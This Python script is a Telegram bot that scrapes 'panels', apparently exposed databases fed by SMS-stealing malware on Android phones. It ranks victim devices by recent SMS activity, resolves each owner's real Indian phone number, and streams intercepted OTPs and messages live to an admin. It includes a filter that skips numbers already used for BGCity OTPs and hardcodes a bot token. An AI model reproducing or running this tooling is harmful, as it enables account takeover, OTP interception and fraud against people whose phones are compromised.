#!/usr/bin/env python3
"""
⚡ TELEGRAM FRESH NUMBER & LIVE OTP STREAMER — RANK-BY-RECENT ENGINE
====================================================================
Bot: @sheiin_coupoonBot (8642694135:AAGQVebkZ0MqrWtCexkdyOg-0Ax17QMCIbM)
Admin: 7837935671 (Exclusive admin-only security gate)

Features:
- TOP-TO-BOTTOM RANKING: Devices ranked strictly by most recent SMS arrival time.
- 100% REAL VERIFIED PHONES ONLY: Resolves genuine 10-digit Indian SIM numbers
  from client records, message headers, and carrier SMS. NEVER outputs device IDs!
- Fresh Activity Guarantee: Ranks devices that received SMS seconds/minutes ago first.
- Explicit Message Timestamps: Shows exact time and relative age of the latest received SMS.
- 1-Click Operations:
    👉 [⚡ Stream Live OTP] -> Streams real-time incoming OTP without stopping.
    👉 [📩 Fetch Latest 5 Msg] -> Displays the latest message arrival time + top 5 recent SMS.
    👉 [🔄 Next Rank Number] -> Delivers the next best ranked active device.
"""

import os
import re
import sys
import time
import json
import asyncio
import html
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple
import aiohttp

# Windows UTF-8 terminal support
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# ================== CONFIGURATION ==================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PANELS_FILE = os.path.join(SCRIPT_DIR, "panels.txt")
USED_NUMBERS_FILE = os.path.join(SCRIPT_DIR, "used_fresh_numbers.txt")
BIGBON_STATE_FILE = os.path.join(SCRIPT_DIR, "bigbon_toggle.json")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8642694135:AAGQVebkZ0MqrWtCexkdyOg-0Ax17QMCIbM").strip()
ADMIN_ID = os.environ.get("ADMIN_ID", "7837935671").strip()
TG_API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"

PHONE_RE = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
OTP_RE = re.compile(r"\b(\d{4,8})\b")
SEVEN_DIGIT_RE = re.compile(r"\b\d{7}\b")
BGCITY_KEYWORDS = ("bgcity", "bigcity", "big city", "bigbon", "big bon")
CARRIER_PHONE_RE = re.compile(
    r"(?:jio(?:\s*number|\s*no)?|airtel(?:\s*number|\s*no)?|mobile(?:\s*number|\s*no)?|number|recharge(?:\s*on|\s*for)?|for|on|quota\s*on)\s*[:\-]?\s*([6-9]\d{9})\b",
    re.I
)


def load_bigbon_state() -> bool:
    if os.path.exists(BIGBON_STATE_FILE):
        try:
            with open(BIGBON_STATE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return bool(data.get("bigbon_filter_active", False))
        except Exception:
            pass
    return False


def save_bigbon_state(active: bool):
    try:
        with open(BIGBON_STATE_FILE, "w", encoding="utf-8") as f:
            json.dump({"bigbon_filter_active": active}, f)
    except Exception:
        pass


def get_main_keyboard(bigbon_active: bool = False) -> dict:
    toggle_text = "🟢 Bigbon: ON" if bigbon_active else "⚪ Bigbon: OFF"
    return {
        "keyboard": [
            [{"text": "⚡ Extract Fresh Number"}, {"text": "📊 Live Rank Top 10"}],
            [{"text": "🔄 Re-Scan Ranked Devices"}, {"text": "⏹ Stop Active Stream"}],
            [{"text": toggle_text}, {"text": "ℹ️ Bot Status"}]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }


def message_has_bgcity_7digit_otp(m: dict) -> bool:
    """Checks if a single message is from BGCity / Bigbon and contains a 7-digit OTP."""
    if not isinstance(m, dict):
        return False
    body = str(m.get("message") or m.get("body") or m.get("text") or "").strip()
    sender = str(m.get("sender") or m.get("from") or "").strip()
    comb = (sender + " " + body).lower()
    if any(kw in comb for kw in BGCITY_KEYWORDS):
        if SEVEN_DIGIT_RE.search(body):
            return True
        otp = extract_otp(body)
        if otp and len(otp) == 7 and otp.isdigit():
            return True
    return False


def check_messages_dict_for_bgcity_7digit(md: dict) -> bool:
    """Scans all messages for any 7-digit OTP from BGCity / Bigbon."""
    if not isinstance(md, dict):
        return False
    for mid, m in md.items():
        if message_has_bgcity_7digit_otp(m):
            return True
    return False


def clean_phone(val: Any) -> Optional[str]:
    if not val:
        return None
    val_str = str(val).strip()
    m = PHONE_RE.search(val_str)
    if m:
        return m.group(1)
    digits = re.sub(r"\D", "", val_str)
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    elif len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
        return digits[2:]
    return None


def extract_otp(text: str) -> Optional[str]:
    if not text:
        return None
    m = re.search(r"(?:otp|code|pin|verification|passcode)[^\d]{0,20}(\d{4,8})", text, re.I)
    if m:
        return m.group(1)
    m2 = OTP_RE.search(text)
    return m2.group(1) if m2 else None


def format_msg_time(ts_ms: int) -> Tuple[str, str]:
    now_ms = time.time() * 1000
    diff_sec = max(0, (now_ms - ts_ms) / 1000.0)
    if diff_sec < 60:
        rel = f"{int(diff_sec)} sec ago"
    elif diff_sec < 3600:
        rel = f"{diff_sec / 60.0:.1f} min ago"
    else:
        rel = f"{diff_sec / 3600.0:.1f} hrs ago"

    exact = time.strftime("%I:%M:%S %p", time.localtime(ts_ms / 1000))
    return rel, exact


def load_panels() -> List[str]:
    panels = []
    seen = set()
    if os.path.exists(PANELS_FILE):
        with open(PANELS_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                url = line.split("|||")[0].strip().rstrip("/")
                if url and url.startswith("http") and url not in seen:
                    panels.append(url)
                    seen.add(url)
    return panels


def load_used_numbers() -> set:
    if os.path.exists(USED_NUMBERS_FILE):
        try:
            with open(USED_NUMBERS_FILE, "r", encoding="utf-8") as f:
                return {line.strip() for line in f if line.strip()}
        except Exception:
            pass
    return set()


def mark_number_used(phone: str):
    try:
        with open(USED_NUMBERS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{phone}\n")
    except Exception:
        pass


def extract_phone_from_client_dict(dev: dict) -> Optional[str]:
    for k in ("phoneNumber", "phone", "mobile", "mobNo", "number", "msisdn", "subId"):
        p = clean_phone(dev.get(k))
        if p:
            return p
    sims = dev.get("sims")
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                for k in ("phoneNumber", "number", "phone", "mobile"):
                    p = clean_phone(s.get(k))
                    if p:
                        return p
    elif isinstance(sims, dict):
        for s in sims.values():
            if isinstance(s, dict):
                for k in ("phoneNumber", "number", "phone", "mobile"):
                    p = clean_phone(s.get(k))
                    if p:
                        return p
    return None


# ================== MAIN RANKED STREAMER ENGINE ==================
class TelegramFreshBot:
    def __init__(self):
        self.panels = load_panels()
        self.used_numbers = load_used_numbers()
        self.bigbon_filter_active = load_bigbon_state()
        self.session: Optional[aiohttp.ClientSession] = None
        self.ranked_devices: List[Dict[str, Any]] = []
        self.is_scanning = False
        self.last_scan_time = 0
        self.active_stream_task: Optional[asyncio.Task] = None
        self.active_stream_target: Optional[Dict[str, Any]] = None
        self.last_update_id = 0
        self.target_registry: Dict[str, Dict[str, Any]] = {}
        self.target_seq = 100

    def get_main_keyboard(self) -> dict:
        return get_main_keyboard(self.bigbon_filter_active)

    async def device_has_bgcity_7digit_otp(self, panel: str, cid: str) -> bool:
        """Checks if device has received any 7-digit OTP from BGCity / Bigbon."""
        s = await self.get_session()
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=3.5) as r:
                if r.status == 200:
                    md = await r.json(content_type=None)
                    if isinstance(md, dict):
                        return check_messages_dict_for_bgcity_7digit(md)
        except Exception:
            pass
        return False

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(limit=300, limit_per_host=25, enable_cleanup_closed=True, ssl=False)
            self.session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5.0))
        return self.session

    def register_target(self, target: Dict[str, Any]) -> str:
        self.target_seq += 1
        tid = f"r{self.target_seq}"
        self.target_registry[tid] = target
        if len(self.target_registry) > 600:
            for k in list(self.target_registry.keys())[:250]:
                del self.target_registry[k]
        return tid

    # ── Telegram API Helpers ──
    async def send_msg(self, text_html: str, reply_markup: Optional[dict] = None, chat_id: str = ADMIN_ID):
        payload = {
            "chat_id": chat_id,
            "text": text_html,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        try:
            s = await self.get_session()
            async with s.post(f"{TG_API_BASE}/sendMessage", json=payload, timeout=7.0) as r:
                res = await r.json(content_type=None)
                if not res.get("ok"):
                    plain_text = re.sub(r"<[^>]+>", "", text_html)
                    payload["text"] = plain_text
                    payload.pop("parse_mode", None)
                    async with s.post(f"{TG_API_BASE}/sendMessage", json=payload, timeout=7.0) as r2:
                        return await r2.json(content_type=None)
                return res
        except Exception as e:
            print(f"[tg error] send_msg: {e}")
            return None

    async def answer_callback(self, cq_id: str, text: Optional[str] = None):
        payload = {"callback_query_id": cq_id}
        if text:
            payload["text"] = text
        try:
            s = await self.get_session()
            async with s.post(f"{TG_API_BASE}/answerCallbackQuery", json=payload, timeout=4.0):
                pass
        except Exception:
            pass

    # ── Deep Rank-By-Recent-Message Scanner ──
    async def scan_and_rank_all_devices(self) -> List[Dict[str, Any]]:
        if self.is_scanning:
            return self.ranked_devices

        self.is_scanning = True
        s = await self.get_session()
        sem = asyncio.Semaphore(120)
        now_ms = time.time() * 1000
        cutoff_ms = now_ms - (48 * 3600 * 1000)

        async def inspect_panel(panel_url: str) -> List[Dict[str, Any]]:
            async with sem:
                try:
                    async with s.get(f"{panel_url}/messages.json?shallow=true", timeout=3.5) as r:
                        if r.status != 200:
                            return []
                        data = await r.json(content_type=None)
                        if not isinstance(data, dict) or not data:
                            return []

                    cids = list(data.keys())

                    async def inspect_device_messages(cid: str) -> Optional[Dict[str, Any]]:
                        try:
                            async with s.get(f"{panel_url}/messages/{cid}.json?shallow=true", timeout=2.5) as mr:
                                if mr.status == 200:
                                    mdata = await mr.json(content_type=None)
                                    if isinstance(mdata, dict) and mdata:
                                        int_keys = [int(k) for k in mdata.keys() if k.isdigit()]
                                        if int_keys:
                                            max_ts = max(int_keys)
                                            if max_ts >= cutoff_ms:
                                                return {
                                                    "panel": panel_url,
                                                    "cid": str(cid),
                                                    "last_msg_ts": max_ts,
                                                    "sms_count": len(int_keys)
                                                }
                        except Exception:
                            pass
                        return None

                    dev_res = await asyncio.gather(*[inspect_device_messages(c) for c in cids[:25]], return_exceptions=True)
                    return [x for x in dev_res if isinstance(x, dict)]
                except Exception:
                    return []

        print(f"[*] Starting rank sweep across {len(self.panels)} panels...")
        tasks = [inspect_panel(p) for p in self.panels]
        all_res = await asyncio.gather(*tasks, return_exceptions=True)

        flat_devices: List[Dict[str, Any]] = []
        for r in all_res:
            if isinstance(r, list):
                flat_devices.extend(r)

        flat_devices.sort(key=lambda x: x["last_msg_ts"], reverse=True)
        self.ranked_devices = flat_devices
        self.last_scan_time = time.time()
        self.is_scanning = False
        print(f"✓ Ranked {len(flat_devices)} active devices with recent SMS history!")
        return flat_devices

    async def resolve_device_real_phone(self, panel: str, cid: str) -> Optional[str]:
        """Resolves the genuine 10-digit SIM phone number using:
        1. /clients/{cid} direct phone & SIM fields.
        2. /messages/{cid} receivedOn headers.
        3. Carrier / telecom alerts (Jio, Airtel, Vi) inside message bodies.
        Returns a valid 10-digit phone number or None (never a hex CID!).
        """
        s = await self.get_session()

        # 1. Try /clients/{cid}
        try:
            async with s.get(f"{panel}/clients/{cid}.json", timeout=3.0) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if isinstance(d, dict):
                        p = extract_phone_from_client_dict(d)
                        if p:
                            return p
        except Exception:
            pass

        # 2. Try /messages/{cid} headers & carrier text
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=3.5) as r:
                if r.status == 200:
                    md = await r.json(content_type=None)
                    if isinstance(md, dict):
                        # A. Check receivedOn
                        for mid, m in list(md.items())[-12:]:
                            if isinstance(m, dict):
                                p = clean_phone(m.get("receivedOn"))
                                if p:
                                    return p

                        # B. Check carrier messages (Jio, Airtel, Vi quota/recharge alerts)
                        for mid, m in reversed(list(md.items())):
                            if isinstance(m, dict):
                                txt = str(m.get("message") or m.get("body") or "")
                                sender = str(m.get("sender") or m.get("from") or "").upper()
                                if any(x in sender for x in ["JIO", "AIRTEL", "VI", "BSNL", "PAY", "SVC"]):
                                    cm = CARRIER_PHONE_RE.search(txt)
                                    if cm:
                                        p = clean_phone(cm.group(1))
                                        if p:
                                            return p

                        # C. Scan any message in inbox for carrier format
                        for mid, m in reversed(list(md.items())):
                            if isinstance(m, dict):
                                txt = str(m.get("message") or m.get("body") or "")
                                cm = CARRIER_PHONE_RE.search(txt)
                                if cm:
                                    p = clean_phone(cm.group(1))
                                    if p:
                                        return p
        except Exception:
            pass

        return None

    # ── Fetch Latest 5 Messages With Prominent Timestamp ──
    async def fetch_latest_5_messages(self, panel: str, cid: str, phone: str) -> str:
        s = await self.get_session()
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=4.0) as r:
                if r.status != 200:
                    return f"⚠️ Failed to fetch messages (HTTP {r.status})."
                data = await r.json(content_type=None)
                if not isinstance(data, dict) or not data:
                    return f"📭 Inbox is empty on device <code>{html.escape(cid)}</code>."

                items = []
                for mid, mdata in data.items():
                    if isinstance(mdata, dict):
                        ts_raw = mdata.get("timestamp") or mdata.get("time") or mid
                        try:
                            ts_val = int(ts_raw)
                            if ts_val < 10000000000:
                                ts_val *= 1000
                        except Exception:
                            ts_val = 0
                        items.append((ts_val, mid, mdata))

                items.sort(key=lambda x: x[0], reverse=True)
                top5 = items[:5]

                latest_ts = top5[0][0] if top5 else 0
                rel_time, exact_time = format_msg_time(latest_ts) if latest_ts > 0 else ("Unknown", "N/A")

                out = [
                    f"📩 <b>MESSAGES FOR</b> <code>{html.escape(phone)}</code>",
                    f"━━━━━━━━━━━━━━━━━━━━━━",
                    f"🕒 <b>LATEST SMS ARRIVED:</b> <code>{exact_time} ({rel_time})</code>",
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                ]

                for i, (ts_val, mid, m) in enumerate(top5, 1):
                    sender = str(m.get("sender") or m.get("from") or "UNKNOWN")
                    body = str(m.get("message") or m.get("body") or m.get("text") or "").strip()
                    dtime = str(m.get("dateTime") or "")
                    if not dtime and ts_val > 0:
                        dtime = time.strftime("%d-%b %I:%M %p", time.localtime(ts_val / 1000))

                    otp = extract_otp(body)
                    otp_line = f"\n🔑 <b>Extracted OTP:</b> <code>{html.escape(otp)}</code>" if otp else ""

                    out.append(
                        f"<b>{i}. [{html.escape(sender)}]</b> <i>({html.escape(dtime)})</i>\n"
                        f"💬 {html.escape(body)}{otp_line}\n"
                    )

                out.append("━━━━━━━━━━━━━━━━━━━━━━")
                return "\n".join(out)
        except Exception as e:
            return f"❌ Error reading inbox: {html.escape(str(e))}"

    # ── Live OTP Stream Loop ──
    async def stream_device_otps(self, target: Dict[str, Any]):
        phone = target["phone"]
        cid = target["cid"]
        panel = target["panel"]

        mark_number_used(phone)
        self.used_numbers.add(phone)
        self.active_stream_target = target

        tid = self.register_target(target)
        s = await self.get_session()
        seen_mids = set()

        # Seed existing messages to catch only new incoming
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=3.5) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if isinstance(data, dict):
                        seen_mids.update(data.keys())
        except Exception:
            pass

        print(f"[stream] Listening live for +91{phone} on {panel}...")

        try:
            while True:
                await asyncio.sleep(1.0)
                try:
                    async with s.get(f"{panel}/messages/{cid}.json", timeout=3.0) as r:
                        if r.status == 200:
                            data = await r.json(content_type=None)
                            if isinstance(data, dict):
                                for mid, mdata in data.items():
                                    if mid in seen_mids:
                                        continue
                                    seen_mids.add(mid)

                                    if not isinstance(mdata, dict):
                                        continue

                                    txt = str(mdata.get("message") or mdata.get("body") or mdata.get("text") or "").strip()
                                    sender = str(mdata.get("sender") or mdata.get("from") or "UNKNOWN")
                                    if not txt:
                                        continue

                                    otp = extract_otp(txt)
                                    now_str = datetime.now().strftime("%I:%M:%S %p")

                                    alert_text = (
                                        f"🔥 <b>INCOMING LIVE OTP / SMS!</b>\n"
                                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                        f"📱 <b>Phone:</b> <code>{html.escape(phone)}</code> (Tap to Copy)\n"
                                        f"🏢 <b>Sender:</b> <code>{html.escape(sender)}</code>\n"
                                        f"🕒 <b>Arrived At:</b> <code>{now_str}</code>\n"
                                    )
                                    if otp:
                                        alert_text += f"\n🔑 <b>LIVE OTP:</b> <code>{html.escape(otp)}</code>\n"
                                    alert_text += f"\n💬 <b>Content:</b>\n<code>{html.escape(txt)}</code>\n━━━━━━━━━━━━━━━━━━━━━━"

                                    ikb = {
                                        "inline_keyboard": [
                                            [{"text": "📩 Fetch Latest 5", "callback_data": f"fetch_{tid}"}],
                                            [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                                             {"text": "⏹ Stop", "callback_data": "stop_stream"}]
                                        ]
                                    }
                                    await self.send_msg(alert_text, reply_markup=ikb)

                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass

        except asyncio.CancelledError:
            print(f"[stream] Live stream stopped for +91{phone}.")
            self.active_stream_target = None
            raise

    # ── Command & Callback Handlers ──
    async def handle_extract_number(self):
        if self.active_stream_task and not self.active_stream_task.done():
            self.active_stream_task.cancel()

        if not self.ranked_devices or (time.time() - self.last_scan_time > 900):
            await self.send_msg("🔍 <b>Ranking all devices by most recent message arrival... Please wait.</b>")
            await self.scan_and_rank_all_devices()

        if not self.ranked_devices:
            await self.send_msg("⚠️ <b>No active devices found right now. Retrying scan...</b>")
            return

        candidate = None
        # Walk down the ranked list (Top to Bottom) until a device with a valid REAL phone number is found
        while self.ranked_devices:
            dev = self.ranked_devices.pop(0)
            phone = await self.resolve_device_real_phone(dev["panel"], dev["cid"])
            if phone and len(phone) == 10 and phone[0] in "6789":
                dev["phone"] = phone

                # ── Bigbon filter check: exclude numbers that previously received 7-digit OTP from BGCity ──
                if self.bigbon_filter_active:
                    has_7d = await self.device_has_bgcity_7digit_otp(dev["panel"], dev["cid"])
                    if has_7d:
                        print(f"[Bigbon Filter] Excluded +91{phone} (device {dev['cid']}): previously received 7-digit OTP from BGCity")
                        continue

                if phone not in self.used_numbers:
                    candidate = dev
                    break
                elif not candidate:
                    candidate = dev

        if not candidate:
            filter_msg = " (with Bigbon filter ON)" if self.bigbon_filter_active else ""
            await self.send_msg(f"⚠️ <b>No more unassigned devices{filter_msg} with valid phone numbers. Running re-scan...</b>")
            await self.scan_and_rank_all_devices()
            return

        phone = candidate["phone"]
        cid = candidate["cid"]
        panel = candidate["panel"]
        last_ts = candidate["last_msg_ts"]
        sms_count = candidate["sms_count"]
        rel_time, exact_time = format_msg_time(last_ts)

        tid = self.register_target(candidate)

        bigbon_line = "\n🎯 <b>Bigbon Filter:</b> <code>ACTIVE (Clean — No 7D BGCity OTP)</code>" if self.bigbon_filter_active else ""

        text = (
            f"📱 <b>TOP ACTIVE DEVICE ASSIGNED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📞 <b>Phone:</b> <code>{html.escape(phone)}</code> (Tap to Copy)\n"
            f"🕒 <b>Latest SMS Received:</b> <code>{exact_time} ({rel_time})</code>\n"
            f"📊 <b>Total SMS History:</b> <code>{sms_count} messages</code>\n"
            f"🆔 <b>Device ID:</b> <code>{html.escape(cid)}</code>\n"
            f"🌐 <b>Panel:</b> <code>{html.escape(panel)}</code>{bigbon_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Tap <b>⚡ Stream Live OTP</b> to catch OTP in real-time or fetch last messages:"
        )

        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "⚡ Stream Live OTP", "callback_data": f"stream_{tid}"},
                    {"text": "📩 Fetch Latest 5 Msg", "callback_data": f"fetch_{tid}"}
                ],
                [
                    {"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                    {"text": "⏹ Stop", "callback_data": "stop_stream"}
                ]
            ]
        }
        await self.send_msg(text, reply_markup=inline_keyboard)

    async def handle_callback_query(self, cq: Dict[str, Any]):
        cq_id = cq.get("id")
        data = str(cq.get("data") or "")
        sender_id = str(cq.get("from", {}).get("id"))

        if sender_id != ADMIN_ID:
            await self.answer_callback(cq_id, "⛔ Access Denied.")
            return

        await self.answer_callback(cq_id)

        if data == "next_fresh":
            await self.handle_extract_number()

        elif data == "stop_stream":
            if self.active_stream_task and not self.active_stream_task.done():
                self.active_stream_task.cancel()
                self.active_stream_task = None
            await self.send_msg("⏹ <b>Live OTP Stream stopped successfully.</b>", reply_markup=self.get_main_keyboard())

        elif data.startswith("stream_"):
            tid = data.split("_", 1)[1]
            target = self.target_registry.get(tid)
            if not target:
                await self.send_msg("⚠️ Session expired. Tap <b>⚡ Extract Fresh Number</b> for next number.")
                return

            if self.active_stream_task and not self.active_stream_task.done():
                self.active_stream_task.cancel()

            self.active_stream_task = asyncio.create_task(self.stream_device_otps(target))

            ikb = {
                "inline_keyboard": [
                    [{"text": "📩 Fetch Latest 5 Msg", "callback_data": f"fetch_{tid}"}],
                    [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                     {"text": "⏹ Stop Stream", "callback_data": "stop_stream"}]
                ]
            }
            await self.send_msg(
                f"🚀 <b>Listening Live for</b> <code>{html.escape(target['phone'])}</code>...\n"
                f"Any incoming SMS / OTP arriving will be posted here instantly!",
                reply_markup=ikb
            )

        elif data.startswith("fetch_"):
            tid = data.split("_", 1)[1]
            target = self.target_registry.get(tid)
            if not target:
                await self.send_msg("⚠️ Session expired. Tap <b>⚡ Extract Fresh Number</b> for next number.")
                return

            await self.send_msg(f"⏳ <b>Fetching latest messages for</b> <code>{html.escape(target['phone'])}</code>...")
            report = await self.fetch_latest_5_messages(target["panel"], target["cid"], target["phone"])

            ikb = {
                "inline_keyboard": [
                    [{"text": "⚡ Start Live Stream", "callback_data": f"stream_{tid}"}],
                    [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"}]
                ]
            }
            await self.send_msg(report, reply_markup=ikb)

    async def handle_text_message(self, text: str, sender_id: str):
        if sender_id != ADMIN_ID:
            await self.send_msg(f"⛔ Unauthorized user ({sender_id}). Locked to Admin.", chat_id=sender_id)
            return

        cmd = text.strip()

        if cmd in ("/start", "ℹ️ Bot Status"):
            stream_info = f"Active ({self.active_stream_target['phone']})" if self.active_stream_target else "Idle"
            bigbon_info = "🟢 ON (Excluding 7-Digit BGCity OTPs)" if self.bigbon_filter_active else "⚪ OFF"
            status_text = (
                f"🤖 <b>RANK-BY-RECENT FRESH NUMBER &amp; OTP ENGINE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👑 <b>Admin ID:</b> <code>{ADMIN_ID}</code>\n"
                f"🌐 <b>Total Panels Loaded:</b> <code>{len(self.panels)}</code>\n"
                f"🏆 <b>Ranked Devices Cached:</b> <code>{len(self.ranked_devices)}</code>\n"
                f"⚡ <b>Live Stream Status:</b> <code>{stream_info}</code>\n"
                f"🎯 <b>Bigbon Filter:</b> <code>{bigbon_info}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Tap <b>⚡ Extract Fresh Number</b> to assign the top-ranked device!"
            )
            await self.send_msg(status_text, reply_markup=self.get_main_keyboard())

        elif cmd in ("🟢 Bigbon: ON", "⚪ Bigbon: OFF", "🎯 Bigbon", "/bigbon", "bigbon"):
            self.bigbon_filter_active = not self.bigbon_filter_active
            save_bigbon_state(self.bigbon_filter_active)
            kb = self.get_main_keyboard()
            if self.bigbon_filter_active:
                msg = (
                    "🟢 <b>BIGBON FILTER ACTIVATED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "✅ Numbers that previously received a <b>7-digit OTP from BGCity</b> will now be <b>EXCLUDED</b>.\n"
                    "🎯 Only fresh numbers with ZERO prior 7-digit BGCity OTPs will be assigned!"
                )
            else:
                msg = (
                    "⚪ <b>BIGBON FILTER DEACTIVATED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "Normal mode restored. All numbers will now be assigned without BGCity filtering."
                )
            await self.send_msg(msg, reply_markup=kb)

        elif cmd in ("⚡ Extract Fresh Number", "/extract"):
            await self.handle_extract_number()

        elif cmd in ("📊 Live Rank Top 10", "/rank"):
            if not self.ranked_devices:
                await self.send_msg("🔍 <b>Ranking devices... Please wait 5 seconds.</b>")
                await self.scan_and_rank_all_devices()

            if not self.ranked_devices:
                await self.send_msg("⚠️ <b>No active ranked devices found.</b>")
                return

            filter_note = "\n🎯 <i>Filter: Bigbon ON (Excluding 7D BGCity OTPs)</i>" if self.bigbon_filter_active else ""
            lines = [f"🏆 <b>TOP 10 ACTIVE DEVICES (RANKED BY RECENT SMS)</b>{filter_note}\n━━━━━━━━━━━━━━━━━━━━━━"]
            count = 0
            for dev in list(self.ranked_devices):
                if count >= 10:
                    break
                if "phone" not in dev:
                    phone = await self.resolve_device_real_phone(dev["panel"], dev["cid"])
                    if phone:
                        dev["phone"] = phone
                    else:
                        continue

                # Bigbon filter in Live Rank
                if self.bigbon_filter_active:
                    has_7d = await self.device_has_bgcity_7digit_otp(dev["panel"], dev["cid"])
                    if has_7d:
                        continue

                rel, exact = format_msg_time(dev["last_msg_ts"])
                used_tag = "[USED] " if dev["phone"] in self.used_numbers else ""
                count += 1
                lines.append(f"<b>{count}.</b> {used_tag}<code>{dev['phone']}</code>\n   🕒 Last SMS: <code>{exact} ({rel})</code>")

            lines.append("━━━━━━━━━━━━━━━━━━━━━━\nTap <b>⚡ Extract Fresh Number</b> to assign the top device.")
            await self.send_msg("\n".join(lines), reply_markup=self.get_main_keyboard())

        elif cmd in ("🔄 Re-Scan Ranked Devices", "/rescan"):
            await self.send_msg("🔄 <b>Re-scanning all panels to rank newest devices... Please wait.</b>")
            await self.scan_and_rank_all_devices()
            await self.send_msg(f"✅ <b>Rank Sweep Complete!</b> {len(self.ranked_devices)} devices ranked top-to-bottom.", reply_markup=self.get_main_keyboard())

        elif cmd in ("⏹ Stop Active Stream", "/stop"):
            if self.active_stream_task and not self.active_stream_task.done():
                self.active_stream_task.cancel()
                self.active_stream_task = None
                await self.send_msg("⏹ <b>Live OTP Stream stopped.</b>", reply_markup=self.get_main_keyboard())
            else:
                await self.send_msg("ℹ️ <b>No active stream is currently running.</b>", reply_markup=self.get_main_keyboard())

    # ── Telegram Polling Loop ──
    async def run(self):
        print("=" * 65)
        print("  ⚡ TELEGRAM FRESH NUMBER & OTP STREAM BOT (RANK-BY-RECENT ENGINE)")
        print(f"  Bot Token : {BOT_TOKEN[:15]}... ({TG_API_BASE})")
        print(f"  Admin ID  : {ADMIN_ID}")
        print(f"  Panels    : {len(self.panels)} loaded from {PANELS_FILE}")
        print("=" * 65)

        # Pre-scan and rank devices on launch
        asyncio.create_task(self.scan_and_rank_all_devices())

        # Notify Admin on Telegram
        welcome = (
            "🚀 <b>RANK-BY-RECENT OTP BOT STARTED!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👑 <b>Admin:</b> <code>{ADMIN_ID}</code>\n"
            f"🌐 <b>Panels Loaded:</b> <code>{len(self.panels)}</code>\n"
            f"🏆 <b>Algorithm:</b> <code>Top-To-Bottom (Most Recent SMS on Top)</code>\n"
            f"📱 <b>Phone Filter:</b> <code>100% Real 10-Digit Mobile Numbers Only</code>\n"
            f"🎯 <b>Bigbon Filter:</b> <code>{'🟢 ON' if self.bigbon_filter_active else '⚪ OFF'}</code>\n\n"
            "Tap <b>⚡ Extract Fresh Number</b> to get the device with freshest SMS activity!"
        )
        await self.send_msg(welcome, reply_markup=self.get_main_keyboard())

        # ── Render Web Service Port Binding (Health Check) ──
        port = int(os.environ.get("PORT", "0"))
        if port > 0:
            from aiohttp import web
            async def health_handler(request):
                return web.Response(text="Bot is running!")
            app = web.Application()
            app.router.add_get("/", health_handler)
            app.router.add_get("/healthz", health_handler)
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, "0.0.0.0", port)
            await site.start()
            print(f"[*] Render Web Health Server running on 0.0.0.0:{port}")

        s = await self.get_session()
        print("[*] Telegram polling active. Waiting for commands...")

        while True:
            try:
                url = f"{TG_API_BASE}/getUpdates?offset={self.last_update_id + 1}&timeout=15"
                async with s.get(url, timeout=25.0) as r:
                    if r.status == 200:
                        res = await r.json(content_type=None)
                        if res.get("ok"):
                            for upd in res.get("result", []):
                                self.last_update_id = upd.get("update_id", self.last_update_id)

                                if "callback_query" in upd:
                                    asyncio.create_task(self.handle_callback_query(upd["callback_query"]))
                                elif "message" in upd:
                                    msg = upd["message"]
                                    sender_id = str(msg.get("from", {}).get("id"))
                                    text = msg.get("text", "")
                                    if text:
                                        asyncio.create_task(self.handle_text_message(text, sender_id))
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"[loop warn] {e}")
                await asyncio.sleep(2.0)


def main():
    bot = TelegramFreshBot()
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped by user.")


if __name__ == "__main__":
    main()
